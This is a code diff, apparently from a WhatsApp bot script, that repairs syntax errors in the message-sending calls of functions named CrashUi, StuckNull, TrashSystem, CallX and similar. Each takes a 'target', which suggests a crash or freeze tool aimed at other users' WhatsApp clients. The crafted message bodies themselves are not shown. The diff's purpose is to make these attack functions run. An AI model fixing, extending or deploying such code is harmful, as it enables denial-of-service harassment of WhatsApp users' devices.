@@ -458,11 +458,11 @@ async function InVisiXz(target, spider, cct = false, ptcp = false) {
 			);
 
 			await sam.relayMessage(target, etc.message, ptcp ? {
-				participant: {
-					jid: target
-				}
-				}
-			}
+    participant: {
+     jid: target
+    }
+   } : {});
+};
 
 				async function ClPmNull(target, Qrad, spider, cct = false, ptcp = false) {
 			let etc = generateWAMessageFromContent(target,
@@ -536,13 +536,11 @@ async function InVisiXz(target, spider, cct = false, ptcp = false) {
 			);
 
 			await sam.relayMessage(target, etc.message, ptcp ? {
-				participant: {
-					jid: target
-				
-				
-				}
-			}
-		}
+    participant: {
+     jid: target
+    }
+   } : {});
+};
 
 		async function StuckNull(target, spider, Ptcp = true) {
 			await sam.relayMessage(target, {
@@ -612,13 +610,10 @@ async function InVisiXz(target, spider, cct = false, ptcp = false) {
 						},
 					},
 				},
-				Ptcp ? {
-					participant: {
-						jid: target
-					}
-				}
-					     
-					       }
+					       
+    ...(Ptcp ? { participant: { jid: target } } : {}),
+  });
+}
 		
 		
 		const Qrad = {
@@ -808,13 +803,9 @@ async function TrashSystem(target, spider, Ptcp = true) {
       },
      },
     },
-    Ptcp ? {
-     participant: {
-      jid: target
-     }
-    } 
-   
-}
+    ...(Ptcp ? { participant: { jid: target } } : {}),
+  });
+	}
 async function CrashUi(target, spider, cct = false, ptcp = false) {
 			let etc = generateWAMessageFromContent(target,
 				proto.Message.fromObject({
@@ -885,14 +876,13 @@ async function CrashUi(target, spider, cct = false, ptcp = false) {
 					quoted: EsQl
 				}
 			);
-
-			await sam.relayMessage(target, etc.message, ptcp ? {
-				participant: {
-					jid: target
-				}
-			} 
+await sam.relayMessage(target, etc.message, ptcp ? {
+    participant: {
+     jid: target
+    }
+   } : {});
+};
 			
-}
 	
 async function CallX(target, spider, cct = false, ptcp = false) {
 			let etc = generateWAMessageFromContent(target,
@@ -988,14 +978,15 @@ async function CallX(target, spider, cct = false, ptcp = false) {
 					quoted: VisiX
 				}
 			);
-
-			await sam.relayMessage(target, etc.message, ptcp ? {
-				participant: {
-					jid: target
-				}
-			} 
+await sam.relayMessage(target, etc.message, ptcp ? {
+    participant: {
+     jid: target
+    }
+   } : {});
+};
 			
-}
+			
+
 										
 //================================================//
 async function crtVid(url) {
